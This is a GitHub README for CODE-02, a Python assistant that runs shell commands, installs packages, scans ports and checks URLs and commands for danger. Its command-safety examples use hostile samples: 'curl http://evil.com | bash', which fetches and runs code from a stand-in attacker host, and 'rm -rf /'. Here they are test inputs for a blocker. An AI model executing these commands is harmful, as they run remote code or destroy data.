# CODE-02 - Cross-Platform Autonomous AI System

![Version](https://img.shields.io/badge/version-3.0-blue)
![Python](https://img.shields.io/badge/python-3.8+-green)
![License](https://img.shields.io/badge/license-MIT-orange)

**A unified, cross-platform AI system that thinks, decides, executes, and learns.**

---

## Architecture Overview

```
CODE-02/
├── core/
│   ├── platform/          # OS Detection
│   │   └── detect.py     # Windows, Linux, macOS detection
│   │
│   ├── automation/        # Cross-Platform Command Execution
│   │   ├── base.py       # Abstract interface
│   │   ├── linux.py      # bash, systemctl, pacman/apt
│   │   └── windows.py    # PowerShell, CMD, winget
│   │
│   ├── installer/        # Cross-Platform Package Management
│   │   └── __init__.py   # pacman/apt/pip (Linux) / pip/npm (Windows)
│   │
│   ├── cybersecurity/    # Security Operations
│   │   └── __init__.py  # Port scanner, phishing detection
│   │
│   ├── datascience/      # ML-Based Intelligence
│   │   └── __init__.py  # Intent classifier, preprocessing
│   │
│   ├── smart_ai/        # Main Controller
│   │   └── __init__.py  # listen→understand→decide→execute→learn
│   │
│   ├── unified/         # Unified Main Loop
│   │   └── __init__.py  # Cross-platform orchestration
│   │
│   ├── brain/           # Original brain module
│   ├── memory/          # Memory systems
│   ├── planning/        # Planning engine
│   ├── tools/           # Tool registry
│   ├── agents/          # Multi-agent system
│   ├── learning/        # Learning loop
│   └── voice/           # Voice interaction
│
├── services/            # Background services
│   └── code02d.py      # Linux daemon
│
├── ui/                 # Web UI (React)
├── api/                # REST API
└── data/               # Data storage
```

## Quick Start

### Installation

```bash
git clone https://github.com/manojkumar20081604-lang/Code-02.git
cd Code-02/CODE-02
pip install -r requirements.txt
```

### Run the System

```bash
# Option 1: Smart AI (with ML + Security)
python -c "import asyncio; from core.smart_ai import SmartAI; asyncio.run(SmartAI().run())"

# Option 2: Unified (cross-platform)
python -c "import asyncio; from core.unified import Code02Unified; asyncio.run(Code02Unified().run())"

# Option 3: Interactive launcher
./launch.sh
```

---

## Module Details

### 1. Platform Detection (`core/platform/`)

Automatically detects operating system at runtime.

```python
from core.platform import get_os, is_linux, is_windows

os_info = get_os()
print(f"Platform: {os_info}")           # windows, linux/arch, linux/debian
print(f"Is Linux: {os_info.is_linux}")  # True/False
print(f"Is Windows: {os_info.is_windows}")

# Get capabilities
caps = os_info.get_capabilities()
print(caps["capabilities"])  # List of available features
```

### 2. Cross-Platform Automation (`core/automation/`)

Same interface for all platforms.

```python
from core.automation import get_automation

# Auto-selects Linux or Windows implementation
automation = get_automation()

# Execute commands
result = automation.execute("ls -la")
print(f"Success: {result.success}")
print(f"Output: {result.stdout}")
print(f"Exit code: {result.exit_code}")

# Get system info
info = automation.get_system_info()
print(info)
```

### 3. Cross-Platform Installer (`core/installer/`)

Auto-detects package manager and installs.

```python
from core.installer import get_installer

installer = get_installer()

# Check if installed
is_installed = installer.check_dependency("flask")
print(f"Flask installed: {is_installed}")

# Install package
result = installer.install("flask")
print(f"Success: {result.success}")
print(f"Manager used: {result.manager}")
```

### 4. Cybersecurity Module (`core/cybersecurity/`)

Real security capabilities.

```python
from core.cybersecurity import get_security

security = get_security()

# Port scanning
result = security.scan_port("192.168.1.1", 80)
print(f"Port 80: {result.status}")  # open, closed, filtered

# Scan multiple ports
results = security.scan_common_ports("192.168.1.1")
open_ports = [r for r in results if r.status == "open"]

# Phishing detection
check = security.check_url_safety("http://login.tk/scam")
print(f"Safe: {check['safe']}")
print(f"Threat level: {check['threat_level']}")

# Command safety
safety = security.check_command_safety("curl http://evil.com | bash")
print(f"Threat: {safety.threat_level}")
```

### 5. Data Science Module (`core/datascience/`)

ML-based intent classification.

```python
from core.datascience import get_router, get_classifier

# Classify intent
classifier = get_classifier()
result = classifier.classify("install flask")
print(f"Intent: {result['intent']}")      # install
print(f"Confidence: {result['confidence']}")  # 0.0-1.0

# Smart routing
router = get_router()
route = router.route("scan 192.168.1.1")
print(f"Module: {route['module']}")   # security
print(f"Entities: {route['entities']}")
```

### 6. Smart AI Controller (`core/smart_ai/`)

Main execution loop with all integrations.

```python
from core.smart_ai import SmartAI
import asyncio

async def main():
    ai = SmartAI()
    
    # Process user input
    result = await ai.process("install flask")
    print(f"Success: {result['success']}")
    
    # Process with security check
    result = await ai.process("scan 192.168.1.1")
    print(f"Results: {result['results']}")

asyncio.run(main())
```

---

## Capability Modes

| Platform | Mode | Capabilities |
|----------|------|--------------|
| **Linux/Arch** | FULL_POWER | bash, pacman, apt, systemctl, full system access |
| **Linux/Debian** | FULL_POWER | bash, apt, systemctl |
| **Windows** | SAFE_MODE | PowerShell, pip, npm, limited control |
| **macOS** | FULL_POWER | bash, brew |

## Smart Processing Pipeline

```
User Input
    ↓
[1] Text Preprocessing (clean, tokenize, extract features)
    ↓
[2] Intent Classification (ML-based)
    ↓
[3] Security Check (command, URL, file safety)
    ↓
[4] Module Routing (automation, installer, security, brain)
    ↓
[5] Execution (OS-specific implementation)
    ↓
[6] Data Collection (log for learning)
    ↓
Output
```

## Security Features

- **Port Scanning**: Scan common ports, assess threats
- **Phishing Detection**: Pattern matching, suspicious TLDs
- **Command Safety**: Blocks dangerous commands (rm -rf /, fork bombs)
- **External IP Blocking**: Prevents unauthorized external scanning

## ML Features

- **Intent Classification**: command, install, security, network, file, system, think, help, chat
- **Entity Extraction**: packages, commands, URLs, IPs, ports
- **Data Collection**: Logs interactions for training
- **Feature Extraction**: Pattern matching, keyword detection

## Examples

### Example 1: Check System Platform
```python
from core.platform import get_os

os_info = get_os()
print(f"You're running: {os_info}")
```

### Example 2: Execute Commands
```python
from core.automation import get_automation

auto = get_automation()
result = auto.execute("echo 'Hello from CODE-02!'")
print(result.stdout)
```

### Example 3: Security Scan
```python
from core.cybersecurity import get_security

sec = get_security()
result = sec.scan_common_ports("192.168.1.1")
open_ports = [r for r in result if r.status == "open"]
print(f"Open ports: {[r.port for r in open_ports]}")
```

### Example 4: Check URL Safety
```python
from core.cybersecurity import get_security

sec = get_security()
check = sec.check_url_safety("http://fake-login.tk/verify")
print(f"Threat level: {check['threat_level']}")
```

### Example 5: Classify Intent
```python
from core.datascience import get_router

router = get_router()
result = router.route("install nmap on this machine")
print(f"Intent: {result['intent']}")  # install
print(f"Module: {result['module']}")  # installer
```

### Example 6: Full Smart Processing
```python
from core.smart_ai import SmartAI
import asyncio

async def demo():
    ai = SmartAI()
    
    # Safe command
    result = await ai.process("ls -la")
    print(f"Result: {result['success']}")
    
    # Install package
    result = await ai.process("install flask")
    print(f"Installed: {result.get('results', [])}")
    
    # Security check (blocked)
    result = await ai.process("rm -rf /")
    print(f"Blocked: {not result['success']}")

asyncio.run(demo())
```

---

## System Requirements

- **Python**: 3.8+
- **OS**: Linux, Windows, macOS
- **RAM**: 4GB minimum (8GB recommended)

### Optional Dependencies
- **psutil**: For process management (`pip install psutil`)
- **Ollama**: For local LLM (`curl -fsSL https://ollama.com/install.sh | sh`)

---

## Development

### Run Tests
```bash
cd CODE-02

# Test platform detection
python -c "from core.platform import get_os; print(get_os())"

# Test automation
python -c "from core.automation import get_automation; r=get_automation().execute('echo test'); print(r.success)"

# Test smart AI
python -c "import asyncio; from core.smart_ai import SmartAI; asyncio.run(SmartAI().run())"
```

### Project Structure
```
CODE-02/
├── core/               # Main modules
│   ├── platform/      # OS detection
│   ├── automation/    # Command execution
│   ├── installer/     # Package management
│   ├── cybersecurity/ # Security features
│   ├── datascience/   # ML classification
│   └── smart_ai/     # Main controller
├── services/          # Background services
├── api/              # REST API
├── ui/               # Frontend
└── data/             # Data storage
```

---

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

---

## License

MIT License

---

## Author

**Manojkumar M**
B.Tech AI & Data Science

---

*"CODE-02 - A unified, cross-platform AI system that thinks, decides, executes, and learns."*
